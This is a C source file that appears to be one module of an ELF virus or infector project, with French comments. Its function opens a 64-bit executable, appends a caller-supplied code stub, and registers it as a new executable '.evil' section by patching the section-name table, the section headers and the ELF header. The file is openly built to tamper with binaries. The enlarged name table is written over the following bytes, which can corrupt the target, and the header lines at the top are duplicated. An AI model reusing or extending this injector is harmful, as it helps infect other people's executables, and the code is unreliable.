#include "../include/death.h"

#define NEW_SECTION_NAME ".evil"

#include "../include/death.h"
#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NEW_SECTION_NAME ".evil"

int add_evil_section(const char *path, const unsigned char *stub, size_t stub_len)
{
    FILE *f = fopen(path, "r+b");
    if (!f)
        return -1;

    Elf64_Ehdr eh;
    if (fread(&eh, 1, sizeof(eh), f) != sizeof(eh)) {
        fclose(f);
        return -1;
    }

    // Lire ancienne table des sections
    if (eh.e_shoff == 0 || eh.e_shnum == 0) {
        fclose(f);
        return -1;
    }

    if (fseek(f, (long)eh.e_shoff, SEEK_SET) != 0) {
        fclose(f);
        return -1;
    }

    size_t old_shdr_size = eh.e_shnum * sizeof(Elf64_Shdr);
    Elf64_Shdr *old_shdr = malloc(old_shdr_size);
    if (!old_shdr) {
        fclose(f);
        return -1;
    }

    if (fread(old_shdr, sizeof(Elf64_Shdr), eh.e_shnum, f) != (size_t)eh.e_shnum) {
        free(old_shdr);
        fclose(f);
        return -1;
    }

    // Lire .shstrtab existante
    Elf64_Shdr shstr = old_shdr[eh.e_shstrndx];
    char *shstrtab = malloc(shstr.sh_size);
    if (!shstrtab) {
        free(old_shdr);
        fclose(f);
        return -1;
    }

    if (fseek(f, (long)shstr.sh_offset, SEEK_SET) != 0) {
        free(old_shdr);
        free(shstrtab);
        fclose(f);
        return -1;
    }

    if (fread(shstrtab, 1, shstr.sh_size, f) != shstr.sh_size) {
        free(old_shdr);
        free(shstrtab);
        fclose(f);
        return -1;
    }

    // Ajouter ".evil" dans shstrtab (en mémoire)
    size_t new_name_off   = shstr.sh_size;
    size_t new_shstr_size = shstr.sh_size + strlen(NEW_SECTION_NAME) + 1;

    char *new_shstrtab = realloc(shstrtab, new_shstr_size);
    if (!new_shstrtab) {
        free(old_shdr);
        free(shstrtab);
        fclose(f);
        return -1;
    }
    shstrtab = new_shstrtab;

    memcpy(shstrtab + new_name_off, NEW_SECTION_NAME, strlen(NEW_SECTION_NAME) + 1);

    // Mettre à jour le header de .shstrtab
    shstr.sh_size = new_shstr_size;
    old_shdr[eh.e_shstrndx] = shstr;

    // Écrire stub à la fin du fichier
    if (fseek(f, 0, SEEK_END) != 0) {
        free(old_shdr);
        free(shstrtab);
        fclose(f);
        return -1;
    }

    Elf64_Off stub_off = ftell(f);
    if (fwrite(stub, 1, stub_len, f) != stub_len) {
        free(old_shdr);
        free(shstrtab);
        fclose(f);
        return -1;
    }

    // Construire nouveau header de section .evil
    Elf64_Shdr newsec;
    memset(&newsec, 0, sizeof(newsec));

    newsec.sh_name      = new_name_off;
    newsec.sh_type      = SHT_PROGBITS;
    newsec.sh_flags     = SHF_ALLOC | SHF_EXECINSTR;
    newsec.sh_offset    = stub_off;
    newsec.sh_addr      = 0; // pas mappé (mais objdump le verra)
    newsec.sh_size      = stub_len;
    newsec.sh_addralign = 0x10;

    // Construire nouvelle table des sections
    size_t new_shnum     = eh.e_shnum + 1;
    size_t new_shdr_size = new_shnum * sizeof(Elf64_Shdr);

    Elf64_Shdr *new_shdr = malloc(new_shdr_size);
    if (!new_shdr) {
        free(old_shdr);
        free(shstrtab);
        fclose(f);
        return -1;
    }

    memcpy(new_shdr, old_shdr, old_shdr_size);
    memcpy(&new_shdr[eh.e_shnum], &newsec, sizeof(newsec));

    // Écrire la nouvelle .shstrtab à son offset d’origine
    if (fseek(f, (long)shstr.sh_offset, SEEK_SET) != 0) {
        free(old_shdr);
        free(shstrtab);
        free(new_shdr);
        fclose(f);
        return -1;
    }

    if (fwrite(shstrtab, 1, new_shstr_size, f) != new_shstr_size) {
        free(old_shdr);
        free(shstrtab);
        free(new_shdr);
        fclose(f);
        return -1;
    }

    // Écrire la nouvelle table des sections à la fin
    if (fseek(f, 0, SEEK_END) != 0) {
        free(old_shdr);
        free(shstrtab);
        free(new_shdr);
        fclose(f);
        return -1;
    }
    Elf64_Off new_shoff = ftell(f);
    if (fwrite(new_shdr, sizeof(Elf64_Shdr), new_shnum, f) != new_shnum) {
        free(old_shdr);
        free(shstrtab);
        free(new_shdr);
        fclose(f);
        return -1;
    }
    // Mettre à jour ELF header
    eh.e_shoff    = new_shoff;
    eh.e_shnum    = new_shnum;
    // e_shstrndx reste le même index, mais pointe vers la nouvelle taille
    // (la section .shstrtab est toujours old_shdr[eh.e_shstrndx])
    if (fseek(f, 0, SEEK_SET) != 0) {
        free(old_shdr);
        free(shstrtab);
        free(new_shdr);
        fclose(f);
        return -1;
    }
    if (fwrite(&eh, 1, sizeof(eh), f) != sizeof(eh)) {
        free(old_shdr);
        free(shstrtab);
        free(new_shdr);
        fclose(f);
        return -1;
    }

    fclose(f);
    free(old_shdr);
    free(shstrtab);
    free(new_shdr);

    return 0;
}